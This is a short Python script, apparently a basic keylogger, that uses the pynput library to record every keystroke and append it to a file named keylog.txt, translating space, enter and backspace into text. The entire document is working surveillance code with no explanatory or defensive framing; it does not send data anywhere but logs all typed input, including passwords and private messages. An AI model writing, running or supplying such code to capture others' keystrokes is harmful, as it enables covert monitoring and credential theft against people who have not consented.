from pynput.keyboard import Listener

keys_info = "keylog.txt"
file_path = r""
extend = "\\"

count = 0
keys_log = []

def on_press(key):
    global keys_log, count

    keys_log.append(key)
    count += 1

    if count >= 1:
        count = 0
        write_file(keys_log)
        keys_log = []

def write_file(keys):
    key_actions = {
        "Key.space": " ",
        "Key.enter": " <enter>\n",
        "Key.backspace": "<"
    }
    
    with open(file_path + extend + "keylog.txt", "a") as f:
        for key in keys:
            k = str(key).replace("'", "")
            f.write(key_actions.get(k, k if "Key" not in k else ""))

with Listener(on_press=on_press, on_release=None) as listener:
    listener.join()
